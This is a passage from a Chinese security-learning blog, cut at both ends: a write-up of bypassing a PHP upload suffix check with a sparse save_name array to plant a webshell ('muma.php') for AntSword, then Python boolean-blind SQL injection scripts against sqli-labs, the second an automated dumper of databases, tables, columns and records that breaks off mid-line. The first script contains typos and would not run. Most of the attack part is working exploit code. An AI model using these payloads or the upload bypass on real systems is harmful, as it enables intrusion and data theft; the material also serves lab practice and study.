invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不同于之前的关键部分是使用`is_arrray()`函数判断了post传参进来的是不是一个数组</span><br><span class="line"></span><br><span class="line">empty()函数将字符串打散为数组</span><br><span class="line"></span><br><span class="line">end()函数指向数组中的最后一个元素，并输出</span><br><span class="line"></span><br><span class="line">reset()函数输出数组当前元素和下一个元素的值，然后将数组的额内部指针重置到数组的第一个元素</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>通过end()函数获得file的最后一个元素，赋值给$ext进行后缀校验</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>后缀符合条件的话就会拼接文件名为首元素+尾元素</p><p>reset()函数用来获取尾元素</p><p>如果我们传入的数组为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save_name=[&quot;muma.php&quot;,&quot;jpg&quot;]</span><br></pre></td></tr></table></figure><p>这样文件的后缀为<code>jpg</code>可以绕过后缀检测，但是组装之后的文件名为<code>muma.php.jpg</code>。</p><p>那么传入的数组可以设置为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save_name=[&quot;muma.php&quot;,不设置,&quot;jpg&quot;]</span><br></pre></td></tr></table></figure><p>当save_name[1]不设置的时候，count的结果仍然是2，这样文件名的后缀就拼接为空，结果为<code>muma.php.</code>,在windows特性中将<code>.</code>省略</p><p>上传一句话木马的php文件bp拦截</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505111337629.png" alt="image-20250511133706518"></p><p>发包</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505111339004.png" alt="image-20250511133943971"></p><p>成功得到图片上传的链接，接下来连接蚁剑即可。</p><p><strong>能够成功绕过的原理：</strong></p><p>传入的数组为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file=[&quot;cj1.php&quot;,不设置,&quot;jpg&quot;]</span><br></pre></td></tr></table></figure><p>在count($file)的计算中，不会计算缺失的索引，只计算实际存在的元素数量，所以count($file)的返回值为2.</p><p>所以<code>$file[count($file)-1]=1</code>，但是$file[1]不存在就会返回null，综合上面最终的拼接结果就为<code>cj1.php</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入脚本</title>
      <link href="/2025/05/04/SQL%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC/"/>
      <url>/2025/05/04/SQL%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="布尔盲注脚本"><a href="#布尔盲注脚本" class="headerlink" title="布尔盲注脚本"></a>布尔盲注脚本</h1><p>跑出数据库名称</p><p>分析这个脚本应该有的结构：<br>1.定义一个变量（输入目标的<code>url</code>）</p><p>2.获取数据库长度的函数</p><p>3.获取数据库名称的函数</p><p>4.主程序的入口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> url=<span class="string">&quot;xxxxx&quot;</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_length</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        payloasd1=<span class="string">&quot;?id=1%27%20and%20(length(database()))%20=%20&#123;&#125;%20--      +&quot;</span>.forma(i)  <span class="comment">#拼接进url进行访问测试，不进行url进行解析的话可能会出现服务器无法解析的情况</span></span><br><span class="line">        <span class="comment">#.format(i)是一个字符串方法，将变量i插入到字符串的指定的位置，这里是将i的值填充到字符串中的占位符&#123;&#125;的位置。</span></span><br><span class="line">        <span class="built_in">print</span>(payload1)</span><br><span class="line">        url1=url+payload1</span><br><span class="line">        r=requests.get(url1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;you are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库的长度为：&quot;</span>,i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_databasename</span>():</span><br><span class="line">    databasename=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">len</span>=get_length()</span><br><span class="line">    <span class="comment">#遍历操作枚举数据库名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>+<span class="number">1</span>)：</span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">               payload2=<span class="string">&#x27;?id=1%27%20and%20(ascii(substr((select%20database())%20,&#123;&#125;,1)))%20=%20&#123;&#125;%20--        +&#x27;</span>.<span class="built_in">format</span>( i, j)<span class="comment">#将循环的i和j的值插入占位符&#123;&#125;的位置</span></span><br><span class="line">                r=requests.get(url+payload2)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span><span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment">#将ascii码转化为字符</span></span><br><span class="line">                databasename += char(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;字符为：&quot;</span>,char(j))</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;数据库名称为&quot;</span>,databasename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#主程序的入口，当直接运行脚本的时候执行get_databasename()函数（作为模块导入的时候不会自动执行</span></span><br><span class="line"> if__name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        get_databasename()</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504272057294.png" alt="image-20250427205700181"></p><p>这只是个简单的获取数据库长度和数据库名的脚本，下面是完整的布尔盲注的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://sql/sqli-labs/Less-5/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_length</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始测试数据库名长度&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and length(database())=<span class="subst">&#123;i&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;数据库长度为：<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>():</span><br><span class="line">    data_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    db_len = db_length()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, db_len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                data_name += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;字符为：<span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;当前数据库名：<span class="subst">&#123;data_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_piece</span>(<span class="params">db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;开始测试<span class="subst">&#123;db_name&#125;</span>数据库中有几张表.....&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;db_name&#125;</span>&#x27;)=<span class="subst">&#123;i&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;db_name&#125;</span>数据库总共有<span class="subst">&#123;i&#125;</span>张表&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name</span>(<span class="params">db_name, table_count</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始猜解表名.....&quot;</span>)</span><br><span class="line">    table_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(table_count):</span><br><span class="line">        <span class="comment"># 获取表长度</span></span><br><span class="line">        tb_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;db_name&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>,1)=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tb_length = j</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>张表名的长度为：<span class="subst">&#123;tb_length&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 猜解表名</span></span><br><span class="line">        current_table = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> tb_length &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tb_length + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> char_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">                    payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;db_name&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>,1),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;char_code&#125;</span>--+&quot;</span></span><br><span class="line">                    r = requests.get(url + payload)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        current_table += <span class="built_in">chr</span>(char_code)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;当前表名: <span class="subst">&#123;current_table&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        table_list.append(current_table)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;完成第<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>张表: <span class="subst">&#123;current_table&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;db_name&#125;</span>库下的<span class="subst">&#123;table_count&#125;</span>张表：<span class="subst">&#123;table_list&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> table_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_num</span>(<span class="params">table_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始猜解每张表的字段数.....&quot;</span>)</span><br><span class="line">    column_num_list = []</span><br><span class="line">    <span class="keyword">for</span> table <span class="keyword">in</span> table_list:</span><br><span class="line">        <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27;)=<span class="subst">&#123;count&#125;</span>--+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;table&#125;</span>表有<span class="subst">&#123;count&#125;</span>个字段&quot;</span>)</span><br><span class="line">                column_num_list.append(count)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n各表字段数：<span class="subst">&#123;column_num_list&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> column_num_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>(<span class="params">table_list, column_num_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始猜解每张表的字段名.....&quot;</span>)</span><br><span class="line">    column_name_list = []</span><br><span class="line">    <span class="keyword">for</span> idx, table <span class="keyword">in</span> <span class="built_in">enumerate</span>(table_list):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;table&#125;</span>表的字段：&quot;</span>)</span><br><span class="line">        columns = []</span><br><span class="line">        <span class="keyword">for</span> col_num <span class="keyword">in</span> <span class="built_in">range</span>(column_num_list[idx]):</span><br><span class="line">            col_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="comment"># 先获取字段长度</span></span><br><span class="line">            <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">                payload = <span class="string">f&quot;?id=1&#x27; and (select length(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; limit <span class="subst">&#123;col_num&#125;</span>,1)=<span class="subst">&#123;length&#125;</span>--+&quot;</span></span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="comment"># 猜解字段名</span></span><br><span class="line">                    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">for</span> char_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">                            payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; limit <span class="subst">&#123;col_num&#125;</span>,1),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;char_code&#125;</span>--+&quot;</span></span><br><span class="line">                            r = requests.get(url + payload)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                                col_name += <span class="built_in">chr</span>(char_code)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                    columns.append(col_name)</span><br><span class="line">                    <span class="built_in">print</span>(col_name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        column_name_list.append(columns)</span><br><span class="line">    <span class="keyword">return</span> column_name_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_data</span>(<span class="params">table_list, column_name_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;开始导出<span class="subst">&#123;db_name&#125;</span>库的数据...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> table_idx, table <span class="keyword">in</span> <span class="built_in">enumerate</span>(table_list):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;table&#125;</span>表的数据：&quot;</span>)</span><br><span class="line">        columns = column_name_list[table_idx]</span><br><span class="line">        <span class="comment"># 获取记录数</span></span><br><span class="line">        <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and (select count(*) from <span class="subst">&#123;db_name&#125;</span>.<span class="subst">&#123;table&#125;</span>)=<span class="subst">&#123;count&#125;</span>--+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;共有<span class="subst">&#123;count&#125;</span>条记录&quot;</span>)</span><br><span class="line">                <span class="comment"># 获取每条记录</span></span><br><span class="line">                <span class="keyword">for</span> record <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">                    record_data = []</span><br><span class="line">                    <span class="keyword">for</span> col <span class="keyword">in</span> columns:</span><br><span class="line">                        <span class="comment"># 获取字段值长度</span></span><br><span class="line">                        <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">                            payload = <span class="string">f&quot;?id=1&#x27; and (select length(<span class="subst">&#123;col&#125;</span>) from <span class="subst">&#123;db_name&#125;</span>.<span class="subst">&#123;table&#125;</span> limit <span class="subst">&#123;record&#125;</span>,1)=<span class="subst">&#123;length&#125;</span>--+&quot;</span></span><br><span class="line">                            r = requests.get(url + payload)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                                <span class="comment"># 猜解字段值</span></span><br><span class="line">                                value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                                <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">                                    <span class="keyword">for</span> char_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">                                        payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select <span 